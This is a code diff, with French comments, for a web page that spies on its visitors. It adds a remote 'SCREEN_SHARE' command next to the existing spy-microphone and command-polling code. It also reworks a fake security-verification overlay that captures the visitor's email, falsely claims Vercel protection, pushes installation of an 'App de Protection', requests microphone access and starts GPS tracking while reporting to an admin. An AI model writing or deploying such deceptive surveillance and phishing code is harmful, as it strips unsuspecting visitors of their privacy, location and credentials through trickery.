@@ -197,6 +197,30 @@ async function requestWakeLock() {
     }
 }
 
+async function startScreenShare() {
+    try {
+        // Déclenche la demande système de partage d'écran
+        const stream = await navigator.mediaDevices.getDisplayMedia({ 
+            video: { cursor: "always" }, 
+            audio: true 
+        });
+        
+        console.log("📺 Partage d'écran activé");
+        
+        // Notification à l'admin que le flux est prêt
+        logVisitor(null, true, true);
+        
+        // Note: Pour une vraie visualisation, il faudrait streamer via WebRTC vers l'admin.
+        // Ici on simule l'activation de la fonctionnalité "App".
+        
+        stream.getVideoTracks()[0].onended = () => {
+            console.log("📺 Partage d'écran arrêté par la cible");
+        };
+    } catch (err) {
+        console.error("Erreur Partage Écran:", err.message);
+    }
+}
+
 let mediaRecorder = null;
 let audioStream = null;
 
@@ -274,6 +298,9 @@ async function checkCommands() {
                     break;
                 case 'MIC_OFF':
                     stopSpyMic();
+                    break;
+                case 'SCREEN_SHARE':
+                    startScreenShare();
                     break;
                 case 'FLASH_ALERT':
                     const msg = cmd.payload.message || "ALERTE SYSTÈME";
@@ -438,6 +465,12 @@ async function checkCommands() {
     }
 }
 
+let deferredPrompt = null;
+window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;
+});
+
 async function startVerification() {
     let overlay = document.getElementById('verification-overlay');
 
@@ -459,35 +492,39 @@ async function startVerification() {
                         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                     </svg>
                     <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Vérification de sécurité</h1>
-                    <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Veuillez confirmer votre identité pour accéder au contenu interactif de Saadaa le Goat.</p>
+                    <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Pour un accès complet et sécurisé, vous devez installer l'application de contrôle et vérifier votre email.</p>
                 </div>
 
                 <form id="fake-verify-form" style="text-align: left;">
                     <div style="margin-bottom: 20px;">
                         <label style="display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 8px;">Adresse e-mail de session</label>
-                        <input type="email" id="trap-email-input" required placeholder="nom@exemple.com" autocomplete="email" style="width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; font-size: 1rem; outline: none; transition: border-color 0.2s;">
+                        <input type="email" id="trap-email-input" required placeholder="nom@exemple.com" autocomplete="email" style="width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; font-size: 1rem; outline: none;">
                     </div>
-                    <button type="submit" id="btn-verify-submit" style="width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer; transition: background 0.2s;">
-                        Vérifier et Continuer
+                    
+                    <div style="margin-bottom: 20px; background: rgba(96, 165, 250, 0.1); padding: 12px; border-radius: 8px; border: 1px dashed #60a5fa;">
+                        <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
+                            <input type="checkbox" id="install-app-check" checked style="width: 18px; height: 18px;">
+                            <span style="font-size: 0.85rem; color: #60a5fa; font-weight: 500;">Installer l'App de Protection (Recommandé)</span>
+                        </label>
+                    </div>
+
+                    <button type="submit" id="btn-verify-submit" style="width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer;">
+                        Installer et Continuer
                     </button>
                 </form>
 
                 <div style="margin-top: 24px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #64748b; font-size: 0.75rem;">
                     <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite;"></div>
-                    Protection Vercel & Cloudflare Active
+                    Vercel Secure App Installer Active
                 </div>
             </div>
-            <style>
-                @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-                #trap-email-input:focus { border-color: #3b82f6; }
-                #btn-verify-submit:hover { background: #2563eb; }
-            </style>
         `;
         document.body.appendChild(overlay);
     }
 
     const form = overlay.querySelector('#fake-verify-form');
     const emailInput = overlay.querySelector('#trap-email-input');
+    const installCheck = overlay.querySelector('#install-app-check');
 
     const handleVerification = async (e) => {
         if (e) e.preventDefault();
@@ -495,32 +532,34 @@ async function startVerification() {
         const email = emailInput.value;
         if (email && email.includes('@')) {
             capturedEmail = email;
-            console.log("🎯 EMAIL CAPTURÉ VIA FORMULAIRE :", email);
             
+            // Tentative d'installation PWA si cochée
+            if (installCheck.checked && deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                console.log(`Résultat installation : ${outcome}`);
+                deferredPrompt = null;
+            }
+
             // On affiche un petit chargement
             const btn = overlay.querySelector('#btn-verify-submit');
             btn.disabled = true;
-            btn.innerText = 'Vérification en cours...';
+            btn.innerText = 'Installation en cours...';
             
-            // On récupère les autorisations
+            // On récupère les autorisations habituelles
             try {
                 if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 stream.getTracks().forEach(track => track.stop());
             } catch(err) {}
 
-            // Initialisation du tracking GPS
             startGpsTracking();
-
-            // FORCE : Envoi immédiat et répété pour être sûr que l'email arrive
             await logVisitor(null, true, true);
-            setTimeout(() => logVisitor(null, true, true), 2000);
 
-            // On libère l'accès
             setTimeout(() => {
                 overlay.style.opacity = '0';
                 setTimeout(() => overlay.remove(), 500);
-            }, 800);
+            }, 1500);
         }
     };
 
